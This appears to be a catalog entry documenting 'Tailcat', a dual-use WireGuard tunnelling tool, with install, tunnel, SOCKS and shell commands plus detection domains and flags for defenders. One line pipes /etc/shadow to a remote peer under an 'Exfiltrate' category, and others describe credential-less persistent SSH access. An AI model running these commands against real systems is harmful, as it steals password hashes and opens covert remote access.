---
Name: Tailcat
Description: Tailcat is netcat over Tailscale's data plane without the control plane. It reuses Tailscale's open WireGuard, magicsock, and DERP code. One side starts a server and gets a short token (tc...), the other connects with it. Connections start through a DERP relay and try to upgrade to direct UDP. If hole punching fails, traffic stays relayed. No account or root needed. It runs entirely in userspace, works with custom DERP servers, has a browser WASM demo, and can publish tokens as DNS TXT records.
Author: Tailscale Inc.
Created: 2026-08-30
Commands:
    - Command: go install github.com/tailscale/tailcat/cmd/tailcat@latest
      Description: Installs the tailcat CLI (also available via nix run github:tailscale/tailcat).
      Usecase: Install the tailcat binary to create WireGuard tunnels without the control plane.
      Category: Install
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS, BSD

    - Command: tailcat
      Description: Starts an ephemeral server (generates a fresh in-memory WireGuard key) that pipes stdin/stdout over the tunnel and prints its token (e.g. tcomFwWCC...). With --serve=<PORT|all|exit-node> it forwards a local TCP port or acts as an exit node instead of piping stdio.
      Usecase: Create a one-time encrypted tunnel and expose stdin/stdout or a local service through it; exit-node mode routes the client's traffic via the server's network.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS, BSD

    - Command: tailcat <TOKEN> <PORT>
      Description: "Client connects to a tailcat server using its token and dials a TCP port through the WireGuard tunnel (gVisor netstack on both sides). Example - tailcat tcXXXXXXXXX 8080. With no PORT argument it connects stdin/stdout."
      Usecase: Reach an internal service or pipe data through the encrypted tunnel from outside the target network.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS, BSD

    - Command: tailcat --serve=no-auth-ssh
      Description: "Runs an auth-free SSH server (Linux/macOS; uses gliderlabs/ssh with an ed25519 host key in ~/.config/tailcat/ssh/) reachable only over the tailcat tunnel. WireGuard authenticates the peer before SSH is reached. Use --serve=22 to proxy to the system SSH server with normal auth."
      Usecase: Persistent shell access to a host behind NAT/firewall with no inbound open ports and no credentials.
      Category: shell-access
      Privileges: User
      OperatingSystem: Linux, MacOS

    - Command: tailcat ssh <TOKEN> [COMMAND]
      Description: "SSH client over tailcat. Connects to a tailcat SSH server and either opens an interactive PTY shell or executes a single command (e.g. tailcat ssh tcXXXXXXXXX ls -la)."
      Usecase: Interactive or non-interactive remote shell through the WireGuard tunnel.
      Category: shell-access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS, BSD

    - Command: tailcat socks <TOKEN> -- curl http://server.tailcat:8081/
      Description: Starts a SOCKS5 proxy routed over the tailcat tunnel. Any SOCKS-aware tool can be proxied (e.g. tailcat socks <TOKEN> curl ...). Tokens also work as case-sensitive URL hostnames directly (tailcat socks curl http://<TOKEN>:8081/).
      Usecase: Proxy arbitrary TCP traffic and tools through the tunnel to reach the server's network or localhost services.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS, BSD

    - Command: cat /etc/shadow | tailcat <TOKEN>
      Description: Pipes a file or command output through the client into the server's stdout (server was started with bare tailcat and blocks until a client connects). Works in both directions for upload/download.
      Usecase: Exfiltrate files or pipe data between two machines over the encrypted DERP-relayed / direct tunnel.
      Category: Exfiltrate
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS, BSD

Full_Path:
    - Filename: tailcat
Detection:
    - Domain: "tc301a.ipn.dev"
    - Domain: "tc302a.ipn.dev"
    - Domain: "tc303a.ipn.dev"
    - Domain: "tc304a.ipn.dev"
    - Command: Execution of the tailcat binary, including with subcommands genkey, parse, resolve, ping, socks, ssh and flags --serve, --key, --derpmap-url, --full-address, --allow.
Resources:
    - Link: https://github.com/tailscale/tailcat
    - Link: https://tailscale.github.io/tailcat/
    - Link: https://tailcat.dev/derpmap.json
    - Link: https://pkg.go.dev/github.com/tailscale/tailcat
---
